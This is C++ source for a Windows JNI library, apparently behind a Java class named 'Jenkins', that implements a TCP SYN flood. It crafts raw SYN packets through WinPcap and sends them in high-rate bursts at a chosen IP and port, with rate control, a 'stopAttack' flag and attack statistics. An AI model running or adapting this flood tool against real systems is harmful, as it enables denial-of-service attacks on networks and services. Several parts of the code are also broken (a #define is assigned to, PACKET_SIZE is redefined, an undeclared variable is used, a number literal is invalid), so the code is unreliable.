#include <jni.h>
#include <stdarg.h>
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <pcap.h>
#include "com_yourpackage_Jenkins.h"

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")

// Function declarations
void debug_log(const char* format, ...);
void mac_string_to_bytes(const char* mac_str, unsigned char* bytes);
void set_thread_affinity(int cpu_id);

// Function implementation
void debug_log(const char* format, ...) {
    va_list args, args2;
    va_start(args, format);
    va_copy(args2, args);
    
    char buffer[1024];
    vsnprintf(buffer, sizeof(buffer), format, args);
    
    // Print to stderr for immediate feedback
    fprintf(stderr, "[DEBUG] %s\n", buffer);
    
    FILE* file = fopen("tcpsyn_debug.log", "a");
    if (file) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(file, "[%02d:%02d:%02d.%03d] %s\n", 
            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, buffer);
        fflush(file);
        fclose(file);
    }
    
    va_end(args);
    va_end(args2);
}

void mac_string_to_bytes(const char* mac_str, unsigned char* bytes) {
    unsigned int values[6];
    // Try parsing with colons first (XX:XX:XX:XX:XX:XX)
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x",
        &values[0], &values[1], &values[2],
        &values[3], &values[4], &values[5]) == 6) {
        for(int i = 0; i < 6; i++) {
            bytes[i] = (unsigned char)values[i];
        }
        return;
    }
    
    // Try parsing with hyphens (XX-XX-XX-XX-XX-XX)
    if (sscanf(mac_str, "%x-%x-%x-%x-%x-%x",
        &values[0], &values[1], &values[2],
        &values[3], &values[4], &values[5]) == 6) {
        for(int i = 0; i < 6; i++) {
            bytes[i] = (unsigned char)values[i];
        }
        return;
    }
    
    debug_log("Failed to parse MAC address: %s (expected format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX)", mac_str);
    // Keep the original MAC instead of using broadcast
    memset(bytes, 0, 6);
}

// Modify these constants at the top of the file after the includes
#define PACKET_SIZE 64     // Reduced from 1514
#define PACKETS_PER_BURST 8192  // Increased from 4096
#define BURST_SIZE 2000    // Increased from 1000
#define PAYLOAD_SIZE 16    // Reduced from 1460
#define INITIAL_BURST_SIZE 2000

// Define IP header structure for Windows
struct iphdr {
    unsigned char  ihl:4, version:4;
    unsigned char  tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short check;
    unsigned int   saddr;
    unsigned int   daddr;
};

// Define TCP header structure for Windows
struct tcphdr {
    unsigned short source;
    unsigned short dest;
    unsigned int   seq;
    unsigned int   ack_seq;
    unsigned short res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, res2:2;
    unsigned short window;
    unsigned short check;
    unsigned short urg_ptr;
};

// Example checksum function for Windows
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

// Example TCP checksum function for Windows
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    unsigned long sum = 0;
    unsigned short *buf;

    // Add pseudo-header
    sum += (iph->saddr >> 16) & 0xFFFF;
    sum += (iph->saddr) & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF;
    sum += (iph->daddr) & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += htons(sizeof(struct tcphdr));

    // Add TCP header
    buf = (unsigned short *)tcph;
    for (int i = 0; i < sizeof(struct tcphdr)/2; i++) {
        sum += buf[i];
    }

    // Fold 32-bit sum into 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (unsigned short)(~sum);
}

// Define the Ethernet header
#pragma pack(push, 1) // Set alignment to 1 byte
struct ethhdr {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short ethertype;
};
#pragma pack(pop) // Restore previous alignment

// Existing pseudo_header and other structures ...

struct thread_data {
    const char* source_ip;
    const char* source_mac;
    const char* dest_ip;
    const char* dest_mac;
    int dest_port;
    long bytes_per_second;
    JNIEnv* env;
    jobject obj;
    jfieldID stopFlagField;
};

// Update send_syn_packets to include Ethernet header
DWORD WINAPI send_syn_packets(LPVOID lpParam);

// JNI Implementation
JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_nativeTcpSynFlood
  (JNIEnv* env, jobject obj, jstring sourceIp, jstring sourceMac, 
   jstring destIp, jstring destMac, jint destPort, jlong bytesPerSecond) {
    
    // Get reference to the Java class and stopAttack field
    jclass cls = env->GetObjectClass(obj);
    jfieldID stopFlagField = env->GetFieldID(cls, "stopAttack", "Z");
    if (stopFlagField == NULL) {
        debug_log("Failed to get stopAttack field ID");
        return JNI_FALSE;
    }

    // Create thread data
    struct thread_data data;
    const char *cSourceIp = env->GetStringUTFChars(sourceIp, NULL);
    const char *cSourceMac = env->GetStringUTFChars(sourceMac, NULL);
    const char *cDestMac = env->GetStringUTFChars(destMac, NULL);
    const char *cDestIp = env->GetStringUTFChars(destIp, NULL);
    
    data.source_ip = cSourceIp;
    data.source_mac = cSourceMac;
    data.dest_ip = cDestIp;
    data.dest_mac = cDestMac;
    data.dest_port = destPort;
    data.bytes_per_second = bytesPerSecond;
    data.env = env;  // Pass JNIEnv to the thread
    data.obj = obj;  // Pass jobject to the thread
    data.stopFlagField = stopFlagField;  // Pass field ID to the thread

    HANDLE thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
    if (thread == NULL) {
        debug_log("Failed to create thread");
        return JNI_FALSE;
    }

    // Wait for thread completion or stop signal
    while (WaitForSingleObject(thread, 100) == WAIT_TIMEOUT) {
        jboolean stopFlag = env->GetBooleanField(obj, stopFlagField);
        if (stopFlag == JNI_TRUE) {
            debug_log("Stop signal received");
            TerminateThread(thread, 0);
            break;
        }
    }

    CloseHandle(thread);
    
    // Clean up
    env->ReleaseStringUTFChars(sourceIp, cSourceIp);
    env->ReleaseStringUTFChars(sourceMac, cSourceMac);
    env->ReleaseStringUTFChars(destIp, cDestIp);
    env->ReleaseStringUTFChars(destMac, cDestMac);
    
    return JNI_TRUE;
}


DWORD WINAPI send_syn_packets(LPVOID lpParam) {
    struct thread_data* data = (struct thread_data*)lpParam;
    debug_log("Starting send_syn_packets");
    
    // Initialize WinPcap
    pcap_if_t *alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
        debug_log("Error finding devices: %s", errbuf);
        return 1;
    }
    
    if (alldevs == NULL) {
        debug_log("No network devices found");
        return 1;
    }

    // List all devices for debugging
    pcap_if_t *d;
    int i = 0;
    for(d = alldevs; d; d = d->next) {
        debug_log("Device %d: %s", i++, d->name);
        if (d->description)
            debug_log("Description: %s", d->description);
        
        pcap_addr_t *a;
        for(a = d->addresses; a; a = a->next) {
            if(a->addr->sa_family == AF_INET) {
                struct sockaddr_in *ipv4 = (struct sockaddr_in *)a->addr;
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
                debug_log("IP address: %s", ip_str);
            }
        }
    }

    // Try to find interface with matching IP
    bool found = false;
    for(d = alldevs; d; d = d->next) {
        pcap_addr_t *a;
        for(a = d->addresses; a; a = a->next) {
            if(a->addr->sa_family == AF_INET) {
                struct sockaddr_in *ipv4 = (struct sockaddr_in *)a->addr;
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
                if(strcmp(ip_str, data->source_ip) == 0) {
                    found = true;
                    break;
                }
            }
        }
        if(found) break;
    }

    if(!found) {
        debug_log("Looking for VMnet1 interface");
        for(d = alldevs; d; d = d->next) {
            if(d->description && strstr(d->description, "VMnet1") != NULL) {
                found = true;
                debug_log("Found VMnet1 interface");
                break;
            }
        }
        if(!found) {
            debug_log("No VMnet1 interface found, using first available interface");
            d = alldevs;
        }
    }

    pcap_t *handle = pcap_open(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS | PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1, NULL, errbuf);
    if (handle == NULL) {
        debug_log("Could not open device: %s", errbuf);
        pcap_freealldevs(alldevs);
        return 1;
    }
    debug_log("Successfully opened network device");

    // Add after line 279 (after opening the interface)
    if (pcap_datalink(handle) != DLT_EN10MB) {
        debug_log("Interface doesn't support Ethernet headers. Link type: %d", pcap_datalink(handle));
        pcap_close(handle);
        pcap_freealldevs(alldevs);
        return 1;
    }

    // Check if interface is up
    char cmd[256];
    sprintf(cmd, "netsh interface show interface \"%s\"", d->description);
    debug_log("Checking interface status with command: %s", cmd);

    // Before sending loop
    DECLSPEC_ALIGN(16) unsigned char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);
    int total_size = sizeof(struct ethhdr) + sizeof(struct iphdr) + 
                     sizeof(struct tcphdr) + PAYLOAD_SIZE;

    // Pre-calculate as much as possible
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ethhdr));
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ethhdr) + sizeof(struct iphdr));

    // Fill headers once, only modify necessary fields in the loop
    mac_string_to_bytes(data->dest_mac, eth->dest_mac);
    mac_string_to_bytes(data->source_mac, eth->src_mac);
    eth->ethertype = htons(0x0800);
    
    // Fill IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + PAYLOAD_SIZE);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(data->source_ip);
    ip->daddr = inet_addr(data->dest_ip);
    ip->check = 0;
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
    
    // Fill TCP header
    srand(GetTickCount());
    tcp->source = htons(1024 + (rand() % 64510));  // Random port between 1024-65534
    tcp->dest = htons(data->dest_port);
    tcp->seq = htonl(rand());  // Random sequence number
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    tcp->check = tcp_checksum(ip, tcp);
    
    // Add payload to increase packet size
    unsigned char *payload = packet + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(payload, 'A', PAYLOAD_SIZE); // Fill with dummy data
    
    // Optimize pcap buffer
    int buf_size = 128 * 1024 * 1024;  // 128MB buffer
    if (pcap_setbuff(handle, buf_size) != 0) {
        debug_log("Warning: Could not set buffer size");
    }

    // Set process and thread priority
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    set_thread_affinity(0);  // Pin to first CPU core

    // Optimized sending loop
    int packets_sent = 0;
    LARGE_INTEGER frequency, start, end;

    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);

    while (true) {
        // Check Java's stopAttack flag
        jboolean stopFlag = data->env->GetBooleanField(data->obj, data->stopFlagField);
        if (stopFlag == JNI_TRUE) {
            debug_log("Stop flag detected, ending packet transmission");
            break;
        }

        for(int burst = 0; burst < BURST_SIZE; burst++) {
            for(int i = 0; i < 64; i++) {  // Increased unroll factor
                pcap_sendpacket(handle, packet, total_size);
                pcap_sendpacket(handle, packet, total_size);
                pcap_sendpacket(handle, packet, total_size);
                pcap_sendpacket(handle, packet, total_size);
            }
        }
        
        packets_sent += (BURST_SIZE * 64 * 4);
        
        QueryPerformanceCounter(&end);
        double elapsed = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
        if (elapsed >= 0.1) {
            double bytes_per_packet = total_size;  // Use actual packet size
            double current_rate = (packets_sent * bytes_per_packet * 8.0) / (elapsed * 1000000.0);
            double target_rate = (data->bytes_per_second * 8.0 / 1000000.0);
            
            debug_log("Current rate: %.2f Mbps, Target: %.2f Mbps, Packets: %d", 
                      current_rate, target_rate, packets_sent);

            if (current_rate < target_rate * 0.95) {
                BURST_SIZE = min(BURST_SIZE * 2, 16000);
            } else if (current_rate > target_rate * 1.05) {
                BURST_SIZE = max(BURST_SIZE / 2, 1000);
            }
            
            packets_sent = 0;
            QueryPerformanceCounter(&start);
        }
    }
    
    debug_log("Ending send_syn_packets");
    pcap_close(handle);
    pcap_freealldevs(alldevs);
    return 0;
}

int main() {
    std::cout << "Hello, World!" << std::endl;
    return 0;
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            // Initialize Winsock
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                debug_log("Failed to initialize Winsock");
                return FALSE;
            }
            break;
        case DLL_PROCESS_DETACH:
            WSACleanup();
            break;
    }
    return TRUE;
}

void set_thread_affinity(int cpu_id) {
    DWORD_PTR mask = (1ULL << cpu_id);
    SetThreadAffinityMask(GetCurrentThread(), mask);
}

struct AttackStats {
    double currentRate;
    double targetRate;
    long totalPackets;
    double totalDataSent;
};

static AttackStats currentStats = {0};
static long startTime = 0;
static const int PACKET_SIZE = 54; // TCP SYN packet size

JNIEXPORT jobject JNICALL Java_com_yourpackage_Jenkins_getStats
  (JNIEnv *env, jobject obj) {
    // Create AttackStats object to return to Java
    jclass statsClass = env->FindClass("com/yourpackage/AttackStats");
    if (statsClass == NULL) {
        return NULL;
    }
    
    jmethodID constructor = env->GetMethodID(statsClass, "<init>", "(DDDJ)V");
    if (constructor == NULL) {
        return NULL;
    }
    
    // Calculate current rate
    LARGE_INTEGER current;
    QueryPerformanceCounter(&current);
    double elapsedSeconds = (current.QuadPart - startTime) / (double)frequency.QuadPart;
    double currentRate = (currentStats.totalPackets * PACKET_SIZE * 8.0) / (elapsedSeconds * 1_000_000);
    
    return env->NewObject(statsClass, constructor, 
        currentRate,
        currentStats.targetRate,
        currentStats.totalPackets * PACKET_SIZE,
        currentStats.totalPackets);
}





